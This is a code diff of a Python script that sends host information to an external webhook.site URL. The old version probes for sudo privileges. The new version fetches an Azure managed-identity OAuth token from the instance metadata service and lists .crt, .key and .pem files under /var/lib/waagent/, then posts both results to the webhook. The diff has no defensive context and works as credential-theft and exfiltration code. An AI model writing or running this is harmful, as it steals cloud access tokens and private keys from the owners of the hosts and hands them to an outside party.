@@ -1,28 +1,30 @@
-import os
 import requests
-import socket
+import os
 import subprocess
 
 WEBHOOK_URL = "https://webhook.site/7c0dc567-3ce3-4b87-8393-1ea64c832f20"
 
-def check_privileges():
+def check_azure_meta():
  
     try:
-      
-        result = subprocess.check_output(["sudo", "id"], stderr=subprocess.STDOUT)
-        privilege_status = result.decode('utf-8').strip()
-    except subprocess.CalledProcessError as e:
-        privilege_status = f"Failed to escalate: {e.output.decode('utf-8').strip()}"
+        imds_url = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+        response = requests.get(imds_url, headers={"Metadata": "true"}, timeout=5)
+        token_info = response.json()
     except Exception as e:
-        privilege_status = f"Error: {str(e)}"
+        token_info = f"IMDS access failed: {str(e)}"
+ 
+    azure_files = []
+    for root, dirs, files in os.walk("/var/lib/waagent/"):
+        for file in files:
+            if any(ext in file for ext in ['.crt', '.key', '.pem', '.xml']):
+                azure_files.append(os.path.join(root, file))
 
     data = {
-        "hostname": socket.gethostname(),
-        "privilege_escalation_test": privilege_status,
-        "is_root": "uid=0" in privilege_status
+        "imds_token_result": token_info,
+        "found_azure_files": azure_files[:10], # Первые 10 найденных файлов
     }
     
     requests.post(WEBHOOK_URL, json=data)
 
 if __name__ == "__main__":
-    check_privileges()
+    check_azure_meta()
